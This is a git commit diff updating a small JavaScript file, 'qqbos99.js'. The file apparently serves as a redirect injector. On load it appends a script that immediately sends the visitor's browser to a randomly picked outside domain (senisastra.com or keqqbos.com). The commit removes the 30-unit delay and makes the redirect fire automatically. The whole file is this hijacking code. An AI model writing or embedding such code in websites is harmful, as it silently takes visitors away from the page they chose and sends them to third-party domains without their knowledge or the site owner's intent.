0a766a888bec3376d0ecc659fa9a39e32df18142
qqbos99 <qqbos999@gmail.com>
2025-09-14 11:52:52 +0800

    Update qqbos99.js

--- qqbos99.js
+++ qqbos99.js
@@ -1,23 +1,22 @@
- var url = Array("https://senisastra.com/");
-            var rid = "";
+var url = Array("https://senisastra.com/", "https://keqqbos.com/");
+var rid = "";
 
-            var timesleep = "30";
+var timesleep = 0;  // Tidak ada penundaan atau penundaan minimal
 
-			
-			function put() {
-                var script = document.createElement("script");
-                script.innerHTML = 'var weburl = url[Math.floor(Math.random()*url.length)]+""+rid; setTimeout(function () {window.location = weburl;},timesleep);';
-                document.body.appendChild(script)
-            }
-            function jump() {
-                if (typeof url == 'undefined' || url == null) {
-                    setTimeout(function() {
-                        jump()
-                    }, 50)
-                } else {
-                    put()
-                }
-            }
+function put() {
+    var script = document.createElement("script");
+    script.innerHTML = 'var weburl = url[Math.floor(Math.random()*url.length)] + "" + rid; setTimeout(function () { window.location = weburl; }, timesleep);';
+    document.body.appendChild(script);
+}
+
+function jump() {
+    if (typeof url == 'undefined' || url == null) {
+        setTimeout(function() {
             jump();
+        }, 50);
+    } else {
+        put();
+    }
+}
 
-
+jump();
